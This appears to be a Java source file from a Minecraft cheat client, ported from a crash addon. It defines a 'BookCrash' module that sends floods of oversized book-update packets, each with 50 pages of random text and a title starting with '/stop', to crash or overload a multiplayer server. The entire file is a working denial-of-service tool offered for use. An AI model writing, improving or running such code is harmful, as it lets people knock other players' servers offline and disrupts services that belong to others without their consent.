// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;

import java.util.ArrayList;
import java.util.Optional;
import java.util.Random;

public class BookCrash extends Module {
    private final Setting<Integer> amount = new Setting<>("Amount", 100, 1, 1000);

    public BookCrash() {
        super("BookCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        for (int i = 0; i < amount.getValue(); i++) {
            sendBadBook();
        }
    }

    private void sendBadBook() {
        String title = "/stop" + new Random().nextDouble() * 400;
        ArrayList<String> pages = new ArrayList<>();
        StringBuilder sb = new StringBuilder();
        Random r = new Random();
        for (int i = 0; i < 255; i++) {
            sb.append((char) ('a' + r.nextInt(26)));
        }
        String page = sb.toString();
        for (int i = 0; i < 50; i++) {
            pages.add(page);
        }
        mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
    }
}
